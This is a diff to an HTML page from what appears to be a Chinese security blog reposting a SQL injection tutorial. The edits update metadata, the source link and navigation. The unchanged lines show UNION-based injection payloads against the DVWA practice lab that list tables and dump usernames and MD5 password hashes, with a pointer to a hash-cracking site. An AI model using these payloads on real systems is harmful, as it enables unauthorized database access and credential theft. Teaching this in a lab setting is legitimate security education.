@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/07/30/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5-10.jpg">
 <meta property="og:image" content="http://yoursite.com/2020/07/30/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5-11.jpg">
 <meta property="article:published_time" content="2020-07-30T08:28:53.190Z">
-<meta property="article:modified_time" content="2020-07-31T05:19:11.320Z">
+<meta property="article:modified_time" content="2020-08-04T09:23:59.096Z">
 <meta property="article:author" content="Seamiloak">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/07/30/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5-1.jpg">
@@ -204,7 +204,7 @@
 <p>我们输入<code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>进行查询：<br>实际执行的Sql语句是：</p>
 <p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-10.jpg" alt><br>通过上图返回信息，我们再获取到：</p>
 <p>·dvwa 数据库有两个数据表，分别是 guestbook 和 users .<br>有些同学肯定还不满足目前获取到的信息，那么我们接下来尝试获取重量级的用户名、密码。<br>由经验我们可以大胆猜测users表的字段为 user 和 password ，所以输入：<code>1&#39; union select user,password from users#</code>进行查询：<br>实际执行的 Sql 语句是：<br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; union select user,password from users#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-11.jpg" alt><br>可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到<code>www.cmd5.com</code>进行解密。<br>直此，同学们应该已经对 Sql 注入有了一个大概得了解，也清楚了 Sql 注入的强大。</p>
-<p>转自简书-Jewel591-sql注入基础原理（超详细）</p>
+<p>转自：<a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">简书-Jewel591-sql注入基础原理（超详细）</a></p>
 
       
 
@@ -297,6 +297,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          sql注入-堆叠注入
+        
+      </div>
+    </a>
   
   
     <a href="/2020/07/17/php%20filter%E7%9A%84%E5%BA%94%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
